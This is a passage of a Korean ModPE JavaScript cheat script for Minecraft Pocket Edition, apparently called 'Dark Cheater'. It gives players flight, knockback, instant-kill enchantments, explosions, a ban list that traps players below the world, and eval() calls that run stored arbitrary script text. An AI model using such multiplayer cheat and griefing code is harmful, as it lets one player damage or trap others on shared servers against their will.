if(showEntHealth){
showEntHealthTarget = v;
}

}

if(getCarriedItem()==266){
if(a==dl.esp[5]&&dl.c[5]==0){
Entity.setVelX(v, 3*(Entity.getX(v)-Player.getX()));
Entity.setVelZ(v, 3*(Entity.getZ(v)-Player.getZ()));
preventDefault();
dl.c[5] = 450;
}
if(a==dl.esp[7]&&dl.c[7]==0){
Entity.setHealth(v, Entity.getHealth(v)-6);
Entity.setHealth(a, Entity.getHealth(a)+6);
preventDefault();
dl.c[7] = 450;
}

}
if(antiTerror[2]&&(adTer||(!adTer&&ad!=a))){
preventDefault();
if(terrorAlert)
Dark.toast(Player.getName(a)+"(이)가 누군가를 공격하였습니다.");
terrorLog += Player.getName(a)+" : PVE 시도\n";
}
terrorLog += Player.getName(a)+" : PVE\n";
if(entName!=""&&a==ad){
Entity.setNameTag(v, entName);
Dark.toast("해당 엔티티에게 이름을 지어주었습니다.");
entName = "";
preventDefault();
}

if(v==nox){
dtm("때리지 마시게나...");
preventDefault();
}

if(v==h.hero){
var rrr = Math.floor(Math.random()*5);
if(rrr==0){
if(h.l) h.m("공격반사!");
else h.m("Reflaction!");
Entity.setHealth(a, Entity.getHealth(a)-4);
preventDefault();
}
else if(rrr==1){
if(h.l) h.m("뒤로 물러나라!");
else h.m("Go Back!");
Entity.setVelX(a, 1.5*(Entity.getX(a)-Entity.getX(v)));
Entity.setVelZ(a, 1.5*(Entity.getZ(a)-Entity.getZ(v)));
}
}
if(scriptOn&&Dark.read("scriptType")==1)
eval(Dark.read("scriptAdded"));
if(gh[2]){
Entity.setVelX(v, 3*(Entity.getX(v)-Player.getX()));
Entity.setVelZ(v, 3*(Entity.getZ(v)-Player.getZ()));
preventDefault();
}
if(hyperLogOn){
if(Player.isPlayer(v)) hyperLog += "["+Dark.getTime(2)+"] "+Player.getName(a)+"(이)가 "+Player.getName(v)+"(을)를 때림 (사용한 아이템 : "+getCarriedItem()+", "+Player.getCarriedItemData()+")\n";
else hyperLog += "["+Dark.getTime(2)+"] "+Player.getName(a)+"(이)가 "+Entity.getEntityTypeId(v)+"번 엔티티를 때림 (사용한 아이템 : "+getCarriedItem()+", "+Player.getCarriedItemData()+")\n";
}
if(a==ad&&Dark.isEnchanted()){
switch(Dark.getEnchant()){
case "추가데미지" : 
if(!(Player.isPlayer(v)&&Level.getGameMode()==1)) Entity.setHealth(v, Entity.getHealth(v)-Dark.getEnchantLevel());
break;
case "폭발" : 
explode(Entity.getX(v), Entity.getY(v), Entity.getZ(v), Dark.getEnchantLevel()/5);
break;
case "즉사" : 
if(!(Player.isPlayer(v)&&Level.getGameMode()==1)) Entity.setHealth(v, -1);
break;
}
}



}


function modTick(){
if(dt>0){
dt--;
}
if(dt==1){
ad = Player.getEntity();
}
for(var n in banList){
teleport(banList[n], Entity.getX(ad), -5, Entity.getZ(ad));
}
if(p.p!=null){
var ss, c;
ss = Math.abs(Math.sin(Math.floor(Entity.getYaw(ad))/180*Math.PI));
c = Math.abs(Math.cos(Math.floor(Entity.getYaw(ad))/180*Math.PI));
ctx.runOnUiThread(new java.lang.Runnable({
run:function(){
if(ss>c){
p.t.setText(" X : "+Math.round(Player.getX()-0.5)+", Y : "+Math.floor(Player.getY())+"\n Z : "+Math.round(Player.getZ()-0.5)+", S : X");
}
else if(ss<c){
p.t.setText(" X : "+Math.round(Player.getX()-0.5)+", Y : "+Math.floor(Player.getY())+"\n Z : "+Math.round(Player.getZ()-0.5)+", S : Z");
}
}
}));
}
if(rt>0){
rt--;
}
if(run){
if(rt==2){
rx = Player.getX();
rz = Player.getZ();
}
else if(rt==1){
var pe = Player.getEntity();
Entity.setVelX(pe, Player.getX()-rx);
Entity.setVelZ(pe, Player.getZ()-rz);
rt = 3;
}
}
if(light){
lx = l.x;
ly = l.y;
lz = l.z;
l.x = Math.round(Player.getX()-0.5);
if(mcpev2) l.y = Math.floor(Player.getY(ad))-1;
else l.y = Math.floor(Player.getY());
l.z = Math.round(Player.getZ()-0.5);
if(l.x!=lx||l.y!=ly||l.z!=lz){
setTile(lx, ly, lz, l.b[0], l.b[1]);
l.b = [getTile(l.x, l.y, l.z), Level.getData(l.x, l.y, l.z)];
setTile(l.x, l.y, l.z, 230);
}
}
if(clock!=null){
var ap, hour, min, sec;
var day = new Date();
hour = day.getHours();
min = day.getMinutes();
sec = day.getSeconds();
if(hour>12){
hour -=12;
ap = " 오후 ";
}
else
ap = " 오전 ";
if(min<10)
min = "0"+min;
if(sec<10)
sec = "0"+sec;
ctx.runOnUiThread(new java.lang.Runnable({
run:function(){
clockText.setText(ap+hour+"시 "+min+"분 "+sec+"초");
}
}));
}
if(walk){
var pe = Player.getEntity();
var wsin, wcos;
wsin = -Math.sin(Math.floor(getYaw())/180*Math.PI);
wcos = Math.cos(Math.floor(getYaw())/180*Math.PI);
if(run){
Entity.setVelX(pe, wsin/2);
Entity.setVelZ(pe, wcos/2);
}
else{
Entity.setVelX(pe, wsin/4);
Entity.setVelZ(pe, wcos/4);
}
}
if(climbing){
var p2x, p2y, p2z;
if(!multi){
p2x = Entity.getX(ad);
p2y = Entity.getY(ad)-1.2;
p2z = Entity.getZ(ad);
}
else{
p2x = Player.getX();
p2y = Player.getY()-1.2;
p2z = Player.getZ();
}
for(var xx=p2x-1;xx<p2x+2;xx++)
for(var zz=p2z-1;zz<p2z+2;zz++)
if(getTile(xx, p2y, zz)!=0){
if(!multi) Entity.setVelY(ad, 0.1);
else Entity.setVelY(Player.getEntity(), 0.1);
}
}
if(j.on){
var pe;
if(!multi) pe = ad;
else pe = Player.getEntity();
if(j.m==1)
Entity.setVelY(pe, 0.00001);
else if(j.m==2){
if(multi){
j.y = Math.floor(getYaw());
j.p = Math.floor(getPitch());
}
else{
j.y = Math.floor(Entity.getYaw(ad));
j.p = Math.floor(Entity.getPitch(ad));
}
j.s = -Math.sin(j.y/180*Math.PI);
j.c = Math.cos(j.y/180*Math.PI);
j.t = -Math.sin(j.p/180*Math.PI);
j.pc = Math.cos(j.p/180*Math.PI);
if(run) j.n = 2;
else j.n = 1;
if(j.f==0){
Entity.setVelX(pe, j.n*j.s*j.pc);
Entity.setVelY(pe, j.n*j.t);
Entity.setVelZ(pe, j.n*j.c*j.pc);
}
else if(j.f==1){
Entity.setVelX(pe, -j.n*j.s*j.pc);
Entity.setVelY(pe, -j.n*j.t);
Entity.setVelZ(pe, -j.n*j.c*j.pc);
}
}
}
if(darkCmd){
darkProcCmd(darkCmd2);
darkCmd = false;
}

for(var n in espNames){
if(dl.c[n]>0)
dl.c[n]--;
}
if(dl.c[3]==405){
anti = 15;
explode(dl.sx+0.5, dl.sy+1.5, dl.sz+0.5, 3);
}
if(dl.c[8]==445||dl.c[9]==445){
anti = 15;
for(var gun=3;gun<30;gun++){
setTile(px+gun*sin, py+2, pz+gun*cos, 0);
explode(px+gun*sin, py+2, pz+gun*cos, 1.7);
}
}

if(auto){
if(dl.c[1]==150)
setTiles(dl.wx-2, dl.wx+2, dl.wy, dl.wy, dl.wz-2, dl.wz+2, 2);
if(dl.c[3]==1)
setTiles(dl.ex-5, dl.ex+5, dl.ey, dl.ey, dl.ez-5, dl.ez+5, 2);
if(dl.c[3]==31)
setTiles(dl.ex-5, dl.ex+5, dl.ey-1, dl.ey-1, dl.ez-5, dl.ez+5, 3);
if(dl.c[3]==61)
setTiles(dl.ex-5, dl.ex+5, dl.ey-2, dl.ey-2, dl.ez-5, dl.ez+5, 3);
if(dl.c[3]==91)
setTiles(dl.ex-5, dl.ex+5, dl.ey-3, dl.ey-3, dl.ez-5, dl.ez+5, 3);
if(dl.c[3]==121)
setTiles(dl.ex-5, dl.ex+5, dl.ey-4, dl.ey-4, dl.ez-5, dl.ez+5, 3);
if(dl.c[3]==151)
setTiles(dl.ex-5, dl.ex+5, dl.ey-5, dl.ey-5, dl.ez-5, dl.ez+5, 3);
if(dl.c[1]==1)
setTiles(dl.sx-1, dl.sx+1, dl.sy+1, dl.sy+3, dl.sz-1, dl.sz+1, 0);
if(dl.c[1]==31)
setTiles(dl.sx-5, dl.sx+5, dl.sy, dl.sy, dl.sz-5, dl.sz+5, 2);
if(dl.c[1]==61)
setTiles(dl.sx-5, dl.sx+5, dl.sy-1, dl.sy-1, dl.sz-5, dl.sz+5, 3);
if(dl.c[1]==91)
setTiles(dl.sx-5, dl.sx+5, dl.sy-2, dl.sy-2, dl.sz-5, dl.sz+5, 3);
if(dl.c[1]==121)
setTiles(dl.sx-5, dl.sx+5, dl.sy-3, dl.sy-3, dl.sz-5, dl.sz+5, 3);
if(dl.c[1]==151)
setTiles(dl.sx-5, dl.sx+5, dl.sy-4, dl.sy-4, dl.sz-5, dl.sz+5, 3);
}

if(anti>0){
anti--;
}
if(darkCheaterActive){
darkCheaterActive = false;
}
if(tickCount==0){
tickCount = 1;
}

if(t.t>0){
t.t--;
}
if(t.t==1){
for(var n in t.s){
if(t.s[n]==0) setTile(t.x[n], t.y[n]-1, t.z[n], 0);
if(t.s[n]==1) setTile(t.x[n], t.y[n]+1, t.z[n], 0);
if(t.s[n]==2) setTile(t.x[n], t.y[n], t.z[n]-1, 0);
if(t.s[n]==3) setTile(t.x[n], t.y[n], t.z[n]+1, 0);
if(t.s[n]==4) setTile(t.x[n]-1, t.y[n], t.z[n], 0);
if(t.s[n]==5) setTile(t.x[n]+1, t.y[n], t.z[n], 0);
}
t.x = [];
t.y = [];
t.z = [];
t.s = [];
}
if(t.x[0]!=undefined&&t.t==0){
t.t = 3;
}
for(var n in wo.user){
if(wo.t[n]>0)
wo.t[n]--;
if(wo.t[n]==1)
setTile(wo.x1[n], wo.y1[n], wo.z1[n], wo.b1[n], wo.bd1[n]);
if(wo.t[n]<0)
wo.t[n]++;
if(wo.t[n]==-1)
setTile(wo.x2[n], wo.y2[n], wo.z2[n], wo.b2[n], wo.bd2[n]);
}
if(!multi){
if(s.run)
Entity.addEffect(ad, MobEffect.movementSpeed, 20, 1, false, false);
if(s.walk){
s.sin = -Math.sin(Math.floor(Entity.getYaw(ad))/180*Math.PI);
s.cos = Math.cos(Math.floor(Entity.getYaw(ad))/180*Math.PI);
Entity.setVelX(ad, s.sin/4);
Entity.setVelZ(ad, s.cos/4);
}
if(s.move==1){
s.x = Math.round(Entity.getX(ad)-0.5);
s.y = Entity.getY(ad)-0.5;
s.z = Math.round(Entity.getZ(ad)-0.5);
for(var xx=s.x-1;xx<s.x+2;xx++)
for(var zz=s.z-1;zz<s.z+2;zz++)
if(getTile(xx, s.y, zz)!=0){
Entity.setVelY(ad, 0.1);
break;
}
}
if(s.move==2){
s.x = Math.round(Entity.getX(ad)-0.5);
s.y = Entity.getY(ad)+1;
s.z = Math.round(Entity.getZ(ad)-0.5);
for(var xx=s.x-1;xx<s.x+2;xx++)
for(var zz=s.z-1;zz<s.z+2;zz++)
if(getTile(xx, s.y, zz)!=0){
Entity.setVelY(ad, 0.00001);
break;
}
}
}
else{
var pe = Player.getEntity();
if(s.rw)
Entity.addEffect(pe, MobEffect.movementSpeed, 20, 1, false, false);
if(s.walk){
s.sin = -Math.sin(Math.floor(getYaw())/180*Math.PI);
s.cos = Math.cos(Math.floor(getYaw())/180*Math.PI);
Entity.setVelX(pe, s.sin/4);
Entity.setVelZ(pe, s.cos/4);
}
if(s.move==1){
s.x = Math.round(Player.getX()-0.5);
s.y = Player.getY()-0.5;
s.z = Math.round(Player.getZ()-0.5);
for(var xx=s.x-1;xx<s.x+2;xx++)
for(var zz=s.z-1;zz<s.z+2;zz++)
if(getTile(xx, s.y, zz)!=0){
Entity.setVelY(pe, 0.1);
break;
}
}
if(s.move==2){
s.x = Math.round(Player.getX()-0.5);
s.y = Player.getY()+1;
s.z = Math.round(Player.getZ()-0.5);
for(var xx=s.x-1;xx<s.x+2;xx++)
for(var zz=s.z-1;zz<s.z+2;zz++)
if(getTile(xx, s.y, zz)!=0){
Entity.setVelY(pe, 0.00001);
break;
}
}
}

if(en.t>0){
en.t--;
}
if(en.t==255){
Level.spawnMob(en.x+4, en.y+2, en.z+4, 38);
Level.spawnMob(en.x-4, en.y+2, en.z-4, 38);
Level.dropItem(en.x+4, en.y, en.z, 2, 264, 1, 0);
Level.dropItem(en.x-4, en.y, en.z, 2, 264, 1, 0);
Level.dropItem(en.x, en.y, en.z+4, 2, 264, 1, 0);
Level.dropItem(en.x, en.y, en.z-4, 2, 264, 1, 0);
}
if(en.t==180){
Level.dropItem(en.x+4, en.y, en.z, 2, 261, 1, 0);
Level.dropItem(en.x-4, en.y, en.z, 2, 262, 7, 0);
Level.dropItem(en.x, en.y, en.z+4, 2, 278, 1, 0);
Level.dropItem(en.x, en.y, en.z-4, 2, 5, 6, 0);
}
if(en.t==105){
Level.spawnMob(en.x-4, en.y+2, en.z+4, 38);
Level.spawnMob(en.x-4, en.y+2, en.z-4, 38);
Level.dropItem(en.x+4, en.y, en.z, 2, 330, 1, 0);
Level.dropItem(en.x-4, en.y, en.z, 2, 328, 1, 0);
Level.dropItem(en.x, en.y, en.z+4, 2, 265, 1, 0);
Level.dropItem(en.x, en.y, en.z-4, 2, 264, 3, 0);
}
if(en.t==30){
Level.spawnMob(en.x-4, en.y+2, en.z-4, 38);
Level.dropItem(en.x+4, en.y, en.z, 2, 46, 3, 0);
Level.dropItem(en.x-4, en.y, en.z, 2, 259, 1, 0);
Level.dropItem(en.x, en.y, en.z+4, 2, 264, 1, 0);
Level.dropItem(en.x, en.y, en.z-4, 2, 406, 1, 0);
}
if(en.t==1){
for(var xx=en.x-1;xx<en.x+2;xx++)
for(var yy=en.y-1;yy<en.y+2;yy++)
for(var zz=en.z-1;zz<en.z+2;zz++)
setTile(xx, yy, zz, 49);
setTile(en.x, en.y, en.z, 247);
setTile(en.x+6, en.y, en.z, 0);
setTile(en.x+6, en.y-1, en.z, 0);
setTile(en.x-6, en.y, en.z, 0);
setTile(en.x-6, en.y-1, en.z, 0);
setTile(en.x, en.y, en.z+6, 0);
setTile(en.x, en.y-1, en.z+6, 0);
setTile(en.x, en.y, en.z-6, 0);
setTile(en.x, en.y-1, en.z-6, 0);
}
if(noxT>0){
noxT--;
Entity.setHealth(nox, 500);
}
if(Entity.getHealth(nox)<=0){
noxT = 0;
}
if(noxT==202){
dtm("나를 부른 이유가 무엇인가...");
}
if(noxT==1){
var rrr = Math.floor(Math.random()*9);
if(rrr==0) dtm("심심하구만...");
if(rrr==1) dtm("안녕하신가, "+Player.getName(ad)+".");
if(rrr==2) particleShot();
if(rrr==3) dtm("이 스크립트를 무단공유하면 작동을 차단할걸세.");
if(rrr==4) dtm("Dark Cheater "+version+"은 잘 사용하고 있는가?");
if(rrr==5) pushMaker();
if(rrr==6) dtm("이 스크립트는 테러용 스크립트가 아니라네...");
if(rrr==7) Entity.setVelY(nox, 1.3);
if(rrr==8) giveDiamonds();
noxT = 201;
}
if(anT>0){
anT--;
}
if(anT<0){
anT++;
}
if(w.tf){
if(getCarriedItem()<256){
if(w.f) setTile(Math.round(Player.getX()-0.5), Player.getY()-2, Math.round(Player.getZ()-0.5), getCarriedItem(), Player.getCarriedItemData());
if(w.h) setTile(Math.round(Player.getX()-0.5), Player.getY()+1, Math.round(Player.getZ()+0.5), getCarriedItem(), Player.getCarriedItemData());
}
}
if(mc){
mx = Math.round(Player.getX()-0.5);
if(getPitch()==90||mc2) my = Player.getY()-3;
else my = Player.getY()-2;
mz = Math.round(Player.getZ()-0.5);
for(var xx=mx-2;xx<mx+3;xx++){
for(var zz=mz-2;zz<mz+3;zz++){
if(getTile(xx, my+1, zz)==20){
setTile(xx, my+1, zz, 0);
}
if(getTile(xx, my-1, zz)==20){
setTile(xx, my-1, zz, 0);
}
if(getTile(xx, my, mz+2)==20){
setTile(xx, my, mz+2, 0);
}
if(getTile(xx, my, mz-2)==20){
setTile(xx, my, mz-2, 0);
}
}}
for(var zz=mz-1;zz<mz+2;zz++){
if(getTile(mx+2, my, zz)==20){
setTile(mx+2, my, zz, 0);
}
if(getTile(mx-2, my, zz)==20){
setTile(mx-2, my, zz, 0);
}
for(var xx=mx-1;xx<mx+2;xx++)
if(getTile(xx, my, zz)==0){
setTile(xx, my, zz, 20);
}
}
}
if(mt>0){
mt--;
}
if(mt==-1){
mx = Player.getX();
my = Player.getY()-4;
mz = Player.getZ();
if(getTile(mx, my-1, mz)!=0){
for(var xx=mx-1;xx<mx+2;xx++)
for(var zz=mz-1;zz<mz+2;zz++)
if(getTile(xx, my+1, zz)==0){
setTile(xx, my+1, zz, 30);
}
mt = 16;
}
}
if(mt==1){
for(var xx=mx-1;xx<mx+2;xx++)
for(var zz=mz-1;zz<mz+2;zz++)
if(getTile(xx, my+1, zz)==30){
setTile(xx, my+1, zz, 0);
}
}
if(nf.tf){
var pe = Player.getEntity();
nf.x = Player.getX();
nf.y = Player.getY();
nf.z = Player.getZ();
nf.v = Entity.getVelY(pe);
if(((nf.v<-0.5&&getTile(nf.x, nf.y-3, nf.z)!=0)||(nf.v<-1&&getTile(nf.x, nf.y-5, nf.z)!=0))&&nf.t==0){
nf.s = Level.spawnMob(nf.x, nf.y-1, nf.z, 10);
Entity.rideAnimal(pe, nf.s);
Entity.setVelY(nf.s, nf.v);
ModPE.showTipMessage("");
nf.t = 3;
}
if(nf.t>0){
nf.t--;
}
if(nf.t==1){
Entity.remove(nf.s);
Entity.setVelY(pe, nf.v);
nf.t = 0;
}
}

if(h.t>0){
h.t--;
Entity.setFireTicks(h.hero, 0);
if(h.l) ModPE.showTipMessage("\n\n\n히로빈 : "+Entity.getHealth(h.hero)+"/500");
else ModPE.showTipMessage("\n\n\nHerobrine : "+Entity.getHealth(h.hero)+"/500");
if(Entity.getHealth(h.hero)<=0){
h.x = Entity.getX(h.hero);
h.y = Entity.getY(h.hero)+1;
h.z = Entity.getZ(h.hero);
Level.dropItem(h.x, h.y, h.z, 1, 264, 31, 0);
Level.dropItem(h.x, h.y, h.z, 1, 46, 53, 0);
Level.dropItem(h.x, h.y, h.z, 1, 259, 1, 36);
Level.dropItem(h.x, h.y, h.z, 1, 259, 1, 0);
Level.dropItem(h.x, h.y, h.z, 1, 262, 12, 0);
Level.dropItem(h.x, h.y, h.z, 1, 266, 7, 0);
if(h.l) h.m("잊지 않겠다, "+Player.getName(Player.getEntity())+"...");
else h.m("I will remember you, "+Player.getName(Player.getEntity())+"...");
h.t = 0;
}
}
if(h.t==101){
var rrr = Math.floor(Math.random()*4);
if(rrr==0) Entity.setPosition(Player.getEntity(), Entity.getX(h.hero), Entity.getY(h.hero)+1, Entity.getZ(h.hero));
if(rrr==1) Entity.setPosition(h.hero, Player.getX(), Player.getY()+1, Player.getZ());
}
if(h.t==1){
h.t = 201;
h.r = Math.floor(Math.random()*15);
if(h.r==0){
if(h.l) h.m("날 부른 이유가 무엇인가...");
else h.m("Wh.y did you called me...");
}
if(h.r==1){
h.x = Entity.getX(h.hero);
h.y = Entity.getY(h.hero);
h.z = Entity.getZ(h.hero);
explode(h.x+4, h.y, h.z+4, 2);
explode(h.x+4, h.y, h.z-4, 2);
explode(h.x-4, h.y, h.z+4, 2);
explode(h.x-4, h.y, h.z-4, 2);
}
if(h.r==2){
h.x = Entity.getX(h.hero);
h.y = Entity.getY(h.hero);
h.z = Entity.getZ(h.hero);
Level.spawnMob(h.x, h.y+2, h.z, 33);
Level.spawnMob(h.x, h.y+2, h.z, 33);
Level.spawnMob(h.x, h.y+2, h.z, 33);
if(h.l) h.m("터지는거 좋아하니?");
else h.m("Do you like explosion?");
}
if(h.r==3){
Entity.setFireTicks(Player.getEntity(), 5);
}
if(h.r==4){
Entity.setHealth(Player.getEntity(), Entity.getHealth(Player.getEntity())-6);
}
if(h.r==5){
Entity.setVelY(Player.getEntity(), 1.3);
}
if(h.r==6){
h.x = Entity.getX(h.hero);
h.y = Entity.getY(h.hero);
h.z = Entity.getZ(h.hero);
yaw = Math.floor(Entity.getYaw(h.hero));
h.s = -Math.sin(yaw/180*Math.PI);
h.c = Math.cos(yaw/180*Math.PI);
setTile(h.x+3*h.s, h.y, h.z+3*h.c, 46);
}
if(h.r==7){
if(h.l) h.m("메테오!!");
else h.m("Meteor!!");
Level.spawnMob(h.x-8, h.y+6, h.z, 65);
Level.spawnMob(h.x, h.y+10, h.z+3, 65);
Level.spawnMob(h.x+4, h.y+7, h.z, 65);
Level.spawnMob(h.x, h.y+14, h.z-5, 65);
Level.spawnMob(h.x-9, h.y+8, h.z, 65);
Level.spawnMob(h.x+6, h.y+13, h.z+3, 65);
Level.spawnMob(h.x-2, h.y+15, h.z-7, 65);
}
if(h.r==8){
h.x = Entity.getX(h.hero);
h.y = Entity.getY(h.hero);
h.z = Entity.getZ(h.hero);
yaw = Math.floor(Entity.getYaw(h.hero));
h.s = -Math.sin(yaw/180*Math.PI);
h.c = Math.cos(yaw/180*Math.PI);
for(var gun=3;gun<30;gun++){
setTile(h.x+gun*h.s, h.y, h.z+gun*h.c, 51);
setTile(h.x+gun*h.s+1, h.y, h.z+gun*h.c+1, 51);
}
}
if(h.r==9){
h.x = Player.getX();
h.y = Player.getY()-1;
h.z = Player.getZ();
for(var xx=h.x-1;xx<h.x+2;xx++)
for(var zz=h.z-1;zz<h.z+2;zz++)
setTile(xx, h.y, zz, 30);
}
if(h.r==10){
h.x = Entity.getX(h.hero);
h.y = Entity.getY(h.hero);
h.z = Entity.getZ(h.hero);
for(var n=0;n<10;n++)
Level.spawnMob(h.x, h.y+2, h.z, 32);
}
if(h.r==11){
h.x = Entity.getX(h.hero);
h.y = Entity.getY(h.hero);
h.z = Entity.getZ(h.hero);
Level.spawnMob(h.x, h.y+4, h.z, 41);
}
if(h.r==12){
if(h.l) h.m("이 화살들은 뭐지..?")
else h.m("What are these arrows..?");
}
if(h.r==13){
Entity.addEffect(Player.getEntity(), MobEffect.confusion, 200, 2, true, false);
}
if(h.r==14){
Entity.addEffect(Player.getEntity(), MobEffect.poison, 200, 2, true, false);
}
}
if(h.r==6){
if(h.t==196){
setTile(h.x+3*h.s+1, h.y, h.z+3*h.c, 46);
}
if(h.t==191){
setTile(h.x+3*h.s-1, h.y, h.z+3*h.c, 46);
}
if(h.t==186){
setTile(h.x+3*h.s, h.y, h.z+3*h.c+1, 46);
}
if(h.t==181){
setTile(h.x+3*h.s, h.y+1, h.z+3*h.c, 46);
}
if(h.t==176){
setTile(h.x+3*h.s, h.y+1, h.z+3*h.c, 0);
Level.spawnMob(Math.floor(h.x+3*h.s)+0.5, h.y+1.6, Math.floor(h.z+3*h.c)+0.5, 65);
}
}
if(h.t>101&&h.r==12){
h.x = Entity.getX(h.hero);
h.y = Entity.getY(h.hero);
h.z = Entity.getZ(h.hero);
yaw = Math.floor(Entity.getYaw(h.hero));
h.s = -Math.sin(yaw/180*Math.PI);
h.c = Math.cos(yaw/180*Math.PI);
var arr = Level.spawnMob(h.x+2*h.s, h.y+1, h.z+2*h.c, 80);
Entity.setVelX(arr, 1.3*h.s);
Entity.setVelY(arr, 0.8);
Entity.setVelZ(arr, 1.3*h.c);
}

for(var n in esp.c){
if(esp.c[n]>0)
esp.c[n]--;
}
if(esp.c[2]>150){
esp.d3x = Entity.getX(ad);
esp.d3y = Entity.getY(ad)-2;
esp.d3z = Entity.getZ(ad);
for(var xx=esp.d3x-1;xx<esp.d3x+2;xx++)
for(var zz=esp.d3z-1;zz<esp.d3z+2;zz++)
if(getTile(xx, esp.d3y, zz)==0||getTile(xx, esp.d3y, zz)==8||getTile(xx, esp.d3y, zz)==9||getTile(xx, esp.d3y, zz)==51){
setTile(xx, esp.d3y, zz, 17, 1);
}
}
if(esp.c[2]==150){
esp.c2 = -1;
}
if(esp.c2==-1){
esp.d3x = Entity.getX(ad);
esp.d3y = Entity.getY(ad)-4;
esp.d3z = Entity.getZ(ad);
if(getTile(esp.d3x, esp.d3y-1, esp.d3z)!=0){
for(var xx=esp.d3x-1;xx<esp.d3x+2;xx++)
for(var zz=esp.d3z-1;zz<esp.d3z+2;zz++)
if(getTile(xx, esp.d3y+2, zz)==0){
setTile(xx, esp.d3y+2, zz, 30);
esp.c2 = 16;
}
}
}
if(esp.c2>0){
esp.c2--;
}
if(esp.c2==1){
for(var xx=esp.d3x-1;xx<esp.d3x+2;xx++)
for(var zz=esp.d3z-1;zz<esp.d3z+2;zz++)
if(getTile(xx, esp.d3y+2, zz)==30){
setTile(xx, esp.d3y+2, zz, 0);
}
}
if(esp.c[3]==1795){
for(var yy=esp.dy+5;yy<esp.dy+9;yy++){
setTile(esp.dx+7, yy, esp.dz+7, 173);
setTile(esp.dx+7, yy, esp.dz, 173);
setTile(esp.dx+7, yy, esp.dz-7, 173);
setTile(esp.dx, yy, esp.dz+7, 173);
setTile(esp.dx, yy, esp.dz-7, 173);
setTile(esp.dx-7, yy, esp.dz+7, 173);
setTile(esp.dx-7, yy, esp.dz, 173);
setTile(esp.dx-7, yy, esp.dz-7, 173);
}
}
if(esp.c[3]==1790){
for(var yy=esp.dy+1;yy<esp.dy+9;yy++){
setTile(esp.dx+7, yy, esp.dz+7, 89);
setTile(esp.dx+7, yy, esp.dz, 89);
setTile(esp.dx+7, yy, esp.dz-7, 89);
setTile(esp.dx, yy, esp.dz+7, 89);
setTile(esp.dx, yy, esp.dz-7, 89);
setTile(esp.dx-7, yy, esp.dz+7, 89);
setTile(esp.dx-7, yy, esp.dz, 89);
setTile(esp.dx-7, yy, esp.dz-7, 89);
}
var p2x, p2y, p2z;
for each(var e in Entity.getAll()){
p2x = Math.abs(Player.getX()-Entity.getX(e));
p2y = Math.abs(Player.getY()-Entity.getY(e));
p2z = Math.abs(Player.getZ()-Entity.getZ(e));
if(p2x<=30&&p2y<=30&&p2z<=30&&ad!=e){
teleport(e, Entity.getX(e), Entity.getY(e)+13, Entity.getZ(e));
Entity.setHealth(e, Entity.getHealth(e)-6);
if(mcpev&&Entity.getEntityTypeId(e)<64) Entity.addEffect(e, MobEffect.wither, 200, 2, true, false);
}
}
}
if(esp.c[3]==1780){
for(var yy=esp.dy+1;yy<esp.dy+9;yy++){
setTile(esp.dx+7, yy, esp.dz+7, 0);
setTile(esp.dx+7, yy, esp.dz, 0);
setTile(esp.dx+7, yy, esp.dz-7, 0);
setTile(esp.dx, yy, esp.dz+7, 0);
setTile(esp.dx, yy, esp.dz-7, 0);
setTile(esp.dx-7, yy, esp.dz+7, 0);
setTile(esp.dx-7, yy, esp.dz, 0);
setTile(esp.dx-7, yy, esp.dz-7, 0);
}
}
if(esp.tf){
ModPE.showTipMessage("\n\n\n              기본기 "+Math.floor((esp.c[0]+14)/15)+"초, 스킬1 "+Math.floor((esp.c[1]+14)/15)+"초, 스킬2 "+Math.floor((esp.c[2]+14)/15)+"초, 궁극기 "+Math.floor((esp.c[3]+14)/15)+"초");
}
if(f.tf){
for(var n=0;n<f.pp.length;n++){
if(ad!=f.pp[n]&&Player.isPlayer(f.pp[n])){
if(getTile(Math.round(Entity.getX(f.pp[n])-0.5), Math.floor(Entity.getY(f.pp[n])-3), Math.round(Entity.getX(f.pp[n])-0.5))==0) f.n[n]++;
else f.n[n] = 0;
if(f.n[n]>10){
Dark.toast(Player.getName(f.pp[n])+"(이)가 공중부양을 시도하였습니다.");
f.x = Math.round(Entity.getX(f.pp[n])-0.5);
f.y = Math.floor(Entity.getY(f.pp[n]));
f.z = Math.round(Entity.getZ(f.pp[n])-0.5);
for(var m=0;m<100;m++){
if(getTile(f.x, f.y-m, f.z)!=0){
f.y -= m;
break;
}
}
teleport(f.pp[n], f.x, f.y+1.5, f.z);
f.n[n] = 0;
}
}
else if(!Player.isPlayer(f.pp[n])){
f.pp.splice(n, 1);
f.n.splice(n, 1);
}
}
}
if(scriptOn&&Dark.read("scriptType")==2)
eval(Dark.read("scriptAdded"));
if(timeLock)
Level.setTime(tlv);
if(jump){
if(Entity.getVelY(Player.getEntity())>0.12&&j2==false){
Entity.setVelY(Player.getEntity(), 0.6);
j2 = true;
}
else if(Entity.getVelY(Player.getEntity())<0){
j2 = false;
}
}
if(gh[1]){
Player.setHealth(20);
}
if(gh[5]){
var yaw2 = Math.floor(getYaw());
var pitch2 = Math.floor(getPitch());
Entity.setRot(Player.getEntity(), yaw2+3, pitch2);
}
if(gh[7]){
var block = getTile(Player.getX(), Player.getY()-2, Player.getZ());
if(block==8||block==9||block==10||block==11){
Entity.setVelY(Player.getEntity(), 0.00001);
}
}
if(loadChest2){
if(loadChestCount==loadChest3){
showChestList();
loadChest = false;
loadChest2 = false;
}
loadChest3 = loadChestCount;
}
if(showEntHealth&&Entity.getHealth(showEntHealthTarget)>0){
Entity.setNameTag(showEntHealthTarget, "health : "+Entity.getHealth(showEntHealthTarget));
}
if(clock2!=null){
ctx.runOnUiThread(new java.lang.Runnable({
run:function(){
clockSeek.setProgress(Level.getTime());
}
}));
}
if(mst>0){
mst--;
}
if(mst==0){
mst = 20;
modSecond(true);
}
if(tttt[0]!=null){
for(var n=0;n<tttt.length;n++){
if(tttt[n].tt>0){
tttt[n].tt--;
}
if(tttt[n].tt==0){
Entity.remove(tttt[n].tp);
tttt.splice(n, 1);
}
}
}
if(autoTorch){
var p2x, p2y, p2z;
p2x = Math.round(Player.getX()-0.5);
p2y = Player.getY();
p2z = Math.round(Player.getZ()-0.5);
var bb = getTile(p2x, p2y-2, p2z);
if(Level.getBrightness(p2x, p2y, p2z)<5){
if(getTile(p2x, p2y-1, p2z)==0&&bb!=0&&bb!=8&&bb!=9&&bb!=10&&bb!=11)
setTile(p2x, p2y-1, p2z, 50);
}

}
var file = new java.io.File(sdcard+"/darkTornado/terrorHelper/link2.txt");
if(file.exists()){
